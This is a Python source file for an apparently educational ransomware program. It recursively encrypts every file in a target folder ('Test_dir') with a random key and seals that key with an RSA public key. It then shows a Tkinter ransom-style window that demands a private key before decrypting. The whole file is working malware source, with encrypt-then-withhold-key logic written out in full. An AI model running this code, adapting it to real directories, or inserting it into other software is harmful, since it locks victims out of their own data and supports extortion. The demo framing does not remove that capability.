#nocode
from encrypt_file import edFile
import os, time, random, rsa
import tkinter as tk

time.clock = time.time

alphabets = "abcdefghijklmnopqrstuvwxyz1234567890=-_,./=+*"
global randomKey
randomKey = "".join(random.choices(alphabets, k = 128))

ed = edFile(randomKey)

def encrypt_folder(folder):
	contents = os.listdir(folder)
	for c in contents:
		f = os.path.join(folder, c)
		if os.path.isfile(f):
			e = ed.encrypt(f)
			open(f, "wb").write(bytes(e, encoding = "utf-8"))
		else:
			encrypt_folder(f)

def encryptKey():
	global randomKey
	public_key = rsa.PublicKey.load_pkcs1(open("publicKey", "r").read().encode("utf8"))
	ed.key = rsa.encrypt(randomKey.encode("utf8"), public_key)
	randomKey = None

def decrypt_folder(folder = None, privKey = None):
	if privKey == None and folder == None:
		privKey = keyInp.get()
		folder = "Test_dir"
	if privKey != "":
		key = rsa.PrivateKey.load_pkcs1(open(privKey, "r").read().encode("utf8"))
		contents = os.listdir(folder)
		for c in contents:
			f = os.path.join(folder, c)
			if os.path.isfile(f):
				e = open(f, "rb").read().decode()
				d = ed.decrypt(e, key)
				open(f, "wb").write(d)
			else:
				decrypt_folder(f, privKey)
	else:
		print("No path specified..")

if __name__ == "__main__":
	encrypt_folder("Test_dir")
	encryptKey()
	root = tk.Tk()
	bgImg = tk.PhotoImage(file = "assets/header-ransomware.png")
	frame = tk.Frame(root, height = 600, width = 800)
	frame.pack()
	imLabel = tk.Label(frame, image = bgImg)
	imLabel.place(relx = 0, rely = 0, relwidth = 1, relheight = 1)
	keyLabel = tk.Label(frame, text = "Enter the path to private key :", bg = "#9c75ff", fg = "#ffffff", relief = "solid", anchor = "w", padx = 10, font = ("Helvetica 11"))
	keyLabel.place(relx = 0.06, rely = 0.065, relwidth = 0.88, relheight = 0.08)
	keyInp = tk.Entry(frame, relief = "flat", highlightthickness = 1, highlightbackground = "red", highlightcolor = "red")
	keyInp.place(relx = 0.32, rely = 0.082, relwidth = 0.6, relheight = 0.05)
	cButton = tk.Button(frame, text = "Decrypt", bg = "#8a8cff", fg = "#ffffff", relief = "solid", command = decrypt_folder)
	cButton.place(relx = 0.45, rely = 0.16, relwidth = 0.1, relheight = 0.05)
	root.mainloop()